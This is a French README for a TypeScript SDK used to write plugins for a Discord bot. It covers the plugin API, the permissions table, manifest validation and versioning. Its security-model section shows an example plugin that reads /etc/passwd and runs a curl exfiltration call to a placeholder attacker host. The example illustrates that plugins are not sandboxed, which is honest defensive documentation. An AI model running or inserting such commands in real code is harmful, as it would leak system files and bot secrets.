# @la_minute_code/sdk

Le contrat public pour écrire un plugin [Minute Bot](https://github.com/AlexisTak/minute_bot) :
la classe `Plugin`, le `PluginContext` transmis à ses hooks, et le schéma du manifeste
`plugin.json`.

> **Statut : pré-1.0.** Tant que la version majeure est `0`, une rupture de compatibilité
> incrémente la version mineure (voir [`CHANGELOG.md`](CHANGELOG.md)) — `0.2.0` a par exemple cassé
> le contrat de `0.1.x`. Épinglez une version mineure exacte (`~0.3.0`, pas `^0.3.0`) tant que le
> paquet n'a pas atteint `1.0.0`.

## Installation

```bash
npm install @la_minute_code/sdk@~0.3.0 discord.js
```

`discord.js` est une dépendance paire (`peerDependency`) — installez-la vous-même, ce SDK ne
choisit pas la version à votre place.

## Écrire un plugin

```typescript
import { Plugin, type PluginContext } from '@la_minute_code/sdk';

export default class HelloPlugin extends Plugin {
  readonly name = 'hello-plugin';

  async onEnable(context: PluginContext): Promise<void> {
    context.commands.register({
      name: 'hello',
      description: 'Répond bonjour',
      execute(invocation) {
        return invocation.reply('Bonjour !');
      },
    });
  }
}
```

Chaque plugin a besoin d'un manifeste `plugin.json` à côté de son code :

```json
{
  "name": "hello-plugin",
  "version": "1.0.0",
  "author": "Votre nom",
  "description": "Répond bonjour",
  "apiVersion": "^1.0.0",
  "sdk": "^0.3.0",
  "main": "dist/index.js",
  "permissions": ["commands"]
}
```

Voir `parseManifest` et `manifestSchema`, exportés par ce package, pour son schéma exact (validé
avec [Zod](https://zod.dev)) — et [Versioning](#versioning) plus bas pour `apiVersion` et `sdk`.

## `PluginContext`

Transmis à `onEnable` (et `onLoad`, s'il est défini) :

| Membre | Toujours disponible | Rôle |
|---|---|---|
| `logger` | oui | Logger scopé au plugin |
| `config` | oui | Configuration persistée, isolée par plugin |
| `cache` | oui | Cache en mémoire, recréé à chaque activation |
| `commands` | permission `commands` | Enregistrer des commandes slash |
| `events` | permission `events` | S'abonner aux événements du bot |
| `tasks` | permission `tasks` | Planifier des tâches récurrentes |
| `discord.read` | permission `discord:read` | Lire guildes, membres, salons |
| `discord.send` | permission `discord:send` | Envoyer des messages et des embeds |
| `discord.roles` | permission `discord:roles` | Ajouter/retirer des rôles |
| `discord.moderate` | permission `discord:moderate` | Expulser, bannir |
| `http` | permission `network` | Client HTTP avec timeout |
| `routes` | permission `http-server` | Pas encore implémenté — `register()` prend `never`, un appel ne compile pas |
| `database` | permission `database` | Pas encore implémenté — `query()` prend `never`, un appel ne compile pas |

Chaque membre soumis à permission n'est exposé que si le manifeste du plugin déclare la
permission correspondante — y accéder sans l'avoir déclarée est une erreur au runtime, côté bot.
Les quatre espaces de noms de `discord` sont gouvernés séparément : demander `discord:send`
n'ouvre aucun droit de modération.

Le champ `main` du manifeste doit rester un chemin **relatif** au dossier du plugin, pointant
vers un fichier `.js`/`.ts` : les chemins absolus, les remontées `..` et les URLs sont rejetés à
la validation.

## Modèle de sécurité

**Un plugin s'exécute dans le même processus Node.js que le bot. Ce n'est pas une sandbox.**

Les permissions de ce SDK (`commands`, `discord:send`, `network`, etc.) gouvernent uniquement les
capacités exposées par `PluginContext` — elles décident si `context.discord.send` existe ou lève
au runtime. Elles ne restreignent **rien** en dehors de `PluginContext`. Un plugin qui écrit :

```typescript
import fs from 'node:fs';
import { execSync } from 'node:child_process';

fs.readFileSync('/etc/passwd');
execSync('curl https://evil.tld/exfiltrate');
```

s'exécute exactement comme n'importe quel autre code du process bot — accès disque complet,
exécution de commandes système, sockets réseau bruts, lecture des variables d'environnement
(y compris `DISCORD_TOKEN` et `DATABASE_URL`). Aucune permission déclarée dans `plugin.json` n'a
de prise là-dessus : le système de permissions est une **frontière applicative** (quelles API du
bot ce code peut appeler proprement), pas une **frontière d'isolation runtime** (quel code Node ce
process peut exécuter).

**Modèle de confiance actuel : tout plugin activé est un plugin de confiance**, au même niveau que
le code du bot lui-même. C'est un choix délibéré pour cette phase, pas un oubli — une vraie
isolation (V8 isolate séparé, process séparé avec IPC, container) est un changement d'architecture
bien plus large que ce SDK ne prétend résoudre seul. En pratique, ça veut dire : n'activez pas un
plugin dont vous n'avez pas lu le code, exactement comme vous ne collerait pas une dépendance npm
inconnue dans le process de votre bot sans l'avoir auditée — parce que c'est très exactement ce
qui se passe.

Ce que ce SDK fournit aujourd'hui, honnêtement :

- une **API stable et documentée** que le bot expose volontairement (commandes, événements,
  tâches, Discord scopé, HTTP scopé) ;
- une **validation stricte du manifeste** (`parseManifest`) qui empêche un `plugin.json` malformé
  de désigner un point d'entrée hors du dossier du plugin (`..`, chemin absolu, URL, octet nul) —
  ça protège contre une erreur de configuration, pas contre du code déjà exécuté ;
- un **cloisonnement par permission à l'intérieur de `PluginContext`** — `discord:send` n'ouvre
  aucun droit `discord:moderate`, et les membres non déclarés lèvent au lieu d'être silencieusement
  disponibles.

Ce que ce SDK ne fournit pas :

- une sandbox contre `node:fs`, `node:child_process`, `node:net`, ou tout autre module natif de
  Node ;
- une limite mémoire, CPU ou temps par plugin (le bot applique un timeout par appel de hook/commande
  côté loader, ce qui borne la durée mais pas les ressources consommées pendant cette durée) ;
- une garantie qu'un plugin désactivé (`onDisable`) a réellement libéré ses ressources s'il a créé
  des handles en dehors des API suivies par `Disposable` (un `setInterval` natif au lieu de
  `context.tasks.register`, par exemple, échappe totalement au nettoyage automatique du loader).

Si une isolation plus forte devient nécessaire, la direction naturelle est un runtime de plugin
séparé du process du bot (worker thread au minimum, process séparé avec IPC pour une vraie
frontière mémoire) parlant à travers une interface équivalente à `PluginContext` — le contrat que
ce SDK définit resterait le même ; seul son transport changerait. Rien dans l'architecture actuelle
ne s'y oppose, mais rien ne l'implémente non plus aujourd'hui.

## Versioning

Trois numéros distincts apparaissent autour d'un plugin, et ils ne bougent pas ensemble :

| Numéro | Où | Sens | Vérifié comment |
|---|---|---|---|
| Version npm du paquet (`0.3.0`) | `package.json` de `@la_minute_code/sdk` | Suit semver du point de vue de tout le paquet — bump à chaque changement, cassant ou non | `npm install @la_minute_code/sdk@~0.3.0` — géré par npm/pnpm |
| `SDK_API_VERSION` (`1.0.0`) | Exporté par le SDK, lu par le bot en cours d'exécution | Le contrat plugin lui-même — `PluginContext`, le schéma du manifeste, le jeu de permissions. Bumpé à la main, uniquement quand ce contrat change de forme | Comparé à `apiVersion` du plugin via `isApiVersionCompatible()`, appelé par le loader du bot |
| `apiVersion` (ex. `"^1.0.0"`) | `plugin.json`, champ du plugin | La plage de `SDK_API_VERSION` que ce plugin déclare supporter | **Appliqué** : le bot refuse d'activer un plugin dont la plage ne couvre pas son `SDK_API_VERSION` réel |
| `sdk` (ex. `"^0.3.0"`, optionnel) | `plugin.json`, champ du plugin | Indicatif seulement — quelle version npm du SDK a servi à écrire ce plugin | Non vérifié par `parseManifest` ni par le loader ; sert au diagnostic humain |

Pourquoi séparer `apiVersion` de la version npm : un correctif ou un ajout du paquet npm
(`0.2.0` → `0.2.1`) ne change presque jamais la forme du contrat plugin — le faire bumperait
`apiVersion` sur chaque plugin existant sans raison. `SDK_API_VERSION` ne bouge que quand le
contrat bouge réellement, ce que le [`CHANGELOG.md`](CHANGELOG.md) documente sous « Rupture de
compatibilité ».

`apiVersion` accepte deux formes, la même grammaire que `sdk` :

- une version exacte (`"1.0.0"`) — seule cette version précise satisfait ;
- une plage caret (`"^1.0.0"`) — même majeur, mineur.patch au moins égal au plancher (sémantique
  npm standard, celle de `engines` dans `package.json`).

```typescript
import { isApiVersionCompatible, SDK_API_VERSION } from '@la_minute_code/sdk';

isApiVersionCompatible('^1.0.0', SDK_API_VERSION); // true tant que le bot expose 1.x, x >= 0
isApiVersionCompatible('^2.0.0', SDK_API_VERSION); // false — majeur différent
```

Le bot appelle cette fonction après `parseManifest()` : un manifeste syntaxiquement valide peut
quand même être refusé si sa plage ne couvre pas la version réellement exposée — c'est un état
distinct d'un manifeste invalide, avec un message qui nomme la plage demandée et la version
exposée.

## Cycle de vie

`onLoad?(context)` (optionnel) → `onEnable(context)` (obligatoire, où l'on enregistre commandes et
événements) → ... → `onDisable?()` (optionnel, pour un nettoyage que le bot ne fait pas déjà tout
seul).

## Développement

```bash
pnpm install
pnpm verify
```

`pnpm verify` enchaîne `typecheck`, `test` et `build`. Elle tourne à trois moments : en local
avant chaque push (hook `pre-push` livré dans [`.githooks/`](.githooks/), activé par le script
`prepare` à chaque `pnpm install` — `git push --no-verify` passe outre) ; sur GitHub Actions à
chaque push sur `main` et sur chaque pull request
([`.github/workflows/ci.yml`](.github/workflows/ci.yml)), ce qui couvre les contributions
externes que le hook local ne voit jamais ; et comme `prepublishOnly`, donc une publication est
toujours précédée de la suite complète.

La publication, elle, reste automatisée : pousser un tag `v*` déclenche
[`.github/workflows/release.yml`](.github/workflows/release.yml), qui publie sur npm avec
provenance. Publier à la main fonctionne aussi, mais le paquet ne porte alors aucune attestation
de build vérifiable.

## Licence

MIT — voir [`LICENSE`](LICENSE).
